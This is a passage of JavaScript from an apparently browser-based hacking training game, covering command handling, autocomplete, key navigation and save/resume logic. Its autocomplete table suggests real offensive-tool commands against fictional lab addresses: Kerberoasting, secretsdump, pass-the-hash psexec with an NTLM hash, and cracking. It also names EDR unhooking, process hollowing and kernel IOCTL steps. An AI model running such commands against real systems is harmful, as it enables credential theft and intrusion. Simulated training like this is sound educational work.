      print('║    stats      View your hacker stats and score            ║', 'success');
      print('║    reset      Reset all progress (with confirmation)      ║', 'warning');
      print('║                                                            ║', 'info');
      print('║  UTILITY:                                                  ║', 'info');
      print('║    clear      Clear terminal output                       ║', 'system');
      print('║    help       Show this help message                      ║', 'system');
      print('╚════════════════════════════════════════════════════════════╝', 'info');
      print('', '');
      print('[*] TIP: There are secret commands hidden throughout the game...', 'system');
      print('', '');
      return;
    }

    if (cmd === 'continue') {
      if (gameState.currentLevel > 0 && Object.keys(gameState.levelState).length > 0 &&
          !gameState.levelsCompleted.includes(gameState.currentLevel)) {
        startLevel(gameState.currentLevel, true); // true = continue
      } else {
        print('No level in progress to continue. Use "start".', 'warning');
      }
      return;
    }

    if (cmd === 'stats') {
      showStats();
      return;
    }

    if (cmd === 'start') {
      const firstIncomplete = LEVELS.find(l => !gameState.levelsCompleted.includes(l.id));
      if (firstIncomplete) {
        startLevel(firstIncomplete.id, false); // false = fresh start
      } else {
        print('All levels completed! Use "levels" to replay.', 'success');
      }
      return;
    }

    if (cmd === 'levels') {
      showLevelSelect();
      return;
    }

    if (cmd === 'reset') {
      print('', '');
      print('⚠️  WARNING: This will reset ALL progress!', 'error');
      print('', '');
      print('Type "reset confirm" to confirm, or anything else to cancel.', 'warning');
      return;
    }

    if (cmd === 'reset' && args[0] === 'confirm') {
      // Full reset
      gameState.levelsCompleted = [];
      gameState.currentLevel = 0;
      gameState.levelState = {};
      gameState.inLevel = false;
      gameState.attempts = 0;
      gameState.score = 0;
      gameState.easterEggsFound = [];
      // Keep hackerName - don't reset identity
      saveGame();
      print('', '');
      print(ASCII.skull, 'ascii');
      print('All progress has been reset.', 'warning');
      print(`Your identity (${gameState.hackerName}) has been preserved.`, 'info');
      print('', '');
      return;
    }

    // Handle "reset confirm" as two-word command
    if (trimmed.toLowerCase() === 'reset confirm') {
      gameState.levelsCompleted = [];
      gameState.currentLevel = 0;
      gameState.levelState = {};
      gameState.inLevel = false;
      gameState.attempts = 0;
      gameState.score = 0;
      gameState.easterEggsFound = [];
      saveGame();
      print('', '');
      print(ASCII.skull, 'ascii');
      print('All progress has been reset.', 'warning');
      print(`Your identity (${gameState.hackerName}) has been preserved.`, 'info');
      print('', '');
      return;
    }

    print('Unknown command. Type "help" for commands.', 'error');
    playError();
    return;
  }

  // Level-specific commands
  const level = LEVELS.find(l => l.id === gameState.currentLevel);
  if (level && level.handleCommand) {
    level.handleCommand(cmd, args);
  }
}

// ============================================
// AUTOCOMPLETE
// ============================================
let autocompleteIndex = 0;
let autocompleteItems = [];

// Enhanced autocomplete with subcommand support
const COMMAND_ARGUMENTS = {
  // Level 1
  'nmap': ['192.168.1.100', '-sV', '-sC', '-p-'],
  'gobuster': ['192.168.1.100', 'dir -u http://192.168.1.100'],
  'curl': ['http://192.168.1.100', 'http://192.168.1.100/robots.txt', 'http://192.168.1.100/backup/creds.txt', 'http://192.168.1.100/admin'],
  'ssh': ['admin@192.168.1.100', 'root@192.168.1.100'],
  'cat': ['user.txt', 'flag.txt', '/etc/passwd'],
  // Level 2
  'crackmapexec': ['smb 10.10.10.50', 'smb 10.10.10.100'],
  'smbclient': ['//10.10.10.50/IT_Backup', '//10.10.10.50/Users', '-L 10.10.10.50'],
  'hashcat': ['-m 1000 hash.txt', '-m 13100 ticket.txt'],
  'evil-winrm': ['-i 10.10.10.100 -u svc_backup -p Backup2023!'],
  // Level 3
  'bloodhound-python': ['-d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all'],
  'rubeus': ['kerberoast', 'asreproast', 'harvest'],
  'impacket-secretsdump': ['MEGACORP.LOCAL/svc_sql:SQLAdmin2023!@10.10.10.100'],
  'impacket-psexec': ['Administrator@10.10.10.100 -hashes :a87f3a337d73085c45f9416be5787d86'],
  // Level 4
  'unhook': ['ntdll', 'ntdll.dll', 'kernel32'],
  'obfuscate': ['xor', 'aes', 'uuid'],
  'hollow': ['svchost', 'RuntimeBroker', 'dllhost', 'explorer'],
  'inject': ['early-bird', 'apc', 'thread-hijack'],
  // Level 5
  'disasm': ['WriteMemory', '0x222010', 'AllocatePool', 'ReadMemory'],
  'ioctl': ['0x222014', '0x222010', '0x22200C'],
  'alloc': ['0x1000', '0x2000', '0x4000'],
  'write': ['pool shellcode'],
  // Level 6
  'holyc': ['--edit', '--template'],
  'compile': ['main.hc'],
  'run': ['main.hc']
};

function updateAutocomplete() {
  const value = input.value.trim();
  const valueLower = value.toLowerCase();
  const commands = getCurrentCommands();

  if (!value) {
    autocomplete.style.display = 'none';
    return;
  }

  // Check if we're completing a command or an argument
  const parts = value.split(/\s+/);
  const baseCmd = parts[0].toLowerCase();

  if (parts.length === 1) {
    // Completing base command
    autocompleteItems = commands.filter(c => c.toLowerCase().startsWith(valueLower) && c.toLowerCase() !== valueLower);
  } else {
    // Completing argument - check if we have suggestions for this command
    const argSuggestions = COMMAND_ARGUMENTS[baseCmd] || [];
    const currentArg = parts.slice(1).join(' ').toLowerCase();

    autocompleteItems = argSuggestions
      .filter(arg => arg.toLowerCase().startsWith(currentArg) || (currentArg === '' && arg))
      .map(arg => baseCmd + ' ' + arg);
  }

  if (autocompleteItems.length === 0) {
    autocomplete.style.display = 'none';
    return;
  }

  autocompleteIndex = Math.min(autocompleteIndex, autocompleteItems.length - 1);

  autocomplete.innerHTML = '';
  autocompleteItems.forEach((item, idx) => {
    const div = document.createElement('div');
    div.className = 'autocomplete-item' + (idx === autocompleteIndex ? ' selected' : '');
    div.textContent = item;
    div.onclick = () => {
      input.value = item + (item.includes(' ') ? '' : ' ');
      autocomplete.style.display = 'none';
      autocompleteIndex = 0;
      input.focus();
    };
    autocomplete.appendChild(div);
  });

  autocomplete.style.display = 'block';
}

// ============================================
// EVENT HANDLERS
// ============================================
input.addEventListener('input', () => {
  updateAutocomplete();
});

input.addEventListener('keydown', (e) => {
  // Tab completion
  if (e.key === 'Tab') {
    e.preventDefault();
    if (autocompleteItems.length > 0) {
      input.value = autocompleteItems[autocompleteIndex] + (autocompleteItems[autocompleteIndex].includes(' ') ? '' : ' ');
      autocomplete.style.display = 'none';
      autocompleteIndex = 0;
    }
    return;
  }

  // Enter
  if (e.key === 'Enter') {
    e.preventDefault();
    // If autocomplete is showing and item is selected, use that first
    if (autocomplete.style.display === 'block' && autocompleteItems.length > 0) {
      input.value = autocompleteItems[autocompleteIndex] + (autocompleteItems[autocompleteIndex].includes(' ') ? '' : ' ');
      autocomplete.style.display = 'none';
      autocompleteIndex = 0;
      return;
    }
    autocomplete.style.display = 'none';
    processCommand(input.value);
    input.value = '';
    autocompleteIndex = 0;
    return;
  }

  // Arrow key navigation - autocomplete takes priority
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (autocomplete.style.display === 'block' && autocompleteItems.length > 0) {
      // Navigate autocomplete
      autocompleteIndex = Math.max(0, autocompleteIndex - 1);
      updateAutocomplete();
    } else {
      // Navigate command history
      if (gameState.commandHistory.length > 0) {
        gameState.historyIndex = Math.min(gameState.historyIndex + 1, gameState.commandHistory.length - 1);
        input.value = gameState.commandHistory[gameState.historyIndex];
        updateAutocomplete();
      }
    }
    return;
  }

  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (autocomplete.style.display === 'block' && autocompleteItems.length > 0) {
      // Navigate autocomplete
      autocompleteIndex = Math.min(autocompleteItems.length - 1, autocompleteIndex + 1);
      updateAutocomplete();
    } else {
      // Navigate command history
      if (gameState.historyIndex > 0) {
        gameState.historyIndex--;
        input.value = gameState.commandHistory[gameState.historyIndex];
        updateAutocomplete();
      } else {
        gameState.historyIndex = -1;
        input.value = '';
        autocomplete.style.display = 'none';
      }
    }
    return;
  }

  // Escape
  if (e.key === 'Escape') {
    if (levelSelect.style.display === 'block') {
      hideLevelSelect();
      return;
    }
    autocomplete.style.display = 'none';
    autocompleteIndex = 0;
    return;
  }
});

// Sound toggle
document.getElementById('sound-toggle').addEventListener('click', function() {
  initAudio();
  soundEnabled = !soundEnabled;
  this.textContent = soundEnabled ? 'sound: on' : 'sound: off';
  this.classList.toggle('on', soundEnabled);
  if (soundEnabled) playBeep(440, 0.1);
});

// Focus input when clicking terminal (but not other workspaces)
document.getElementById('game-container').addEventListener('click', (e) => {
  // Don't steal focus from other workspaces
  const webWorkspace = document.getElementById('web-workspace');
  const monWorkspace = document.getElementById('mon-workspace');
  const codeEditor = document.getElementById('code-editor-overlay');

  // Check if click is inside a different workspace
  if (webWorkspace && webWorkspace.style.display !== 'none' && webWorkspace.contains(e.target)) {
    return; // Don't steal focus from web workspace
  }
  if (monWorkspace && monWorkspace.style.display !== 'none' && monWorkspace.contains(e.target)) {
    return; // Don't steal focus from monitor workspace
  }
  if (codeEditor && codeEditor.style.display !== 'none' && codeEditor.contains(e.target)) {
    return; // Don't steal focus from code editor
  }

  // Only focus terminal input if we're in the terminal workspace
  if (document.getElementById('terminal-output').style.display !== 'none') {
    input.focus();
  }
});

// ============================================
// INIT
// ============================================
loadGame();

// Check if we were in the middle of a level (e.g., page refresh during play)
if (gameState.inLevel && gameState.currentLevel > 0 && Object.keys(gameState.levelState).length > 0) {
  // Resume the level with existing state
  console.log('[GameState] Resuming level', gameState.currentLevel, 'from saved state');
  startLevel(gameState.currentLevel, true); // true = continue with existing state
} else {
  showMainMenu();
}

// Enable visual effects
setTimeout(() => {
  if (typeof GameEngine !== 'undefined') {
    GameEngine.effects.scanlines(true);
  }
}, 1000);
</script>

<!-- Include game engine and utilities -->
{% include game/engine.html %}
{% include game/utils.html %}
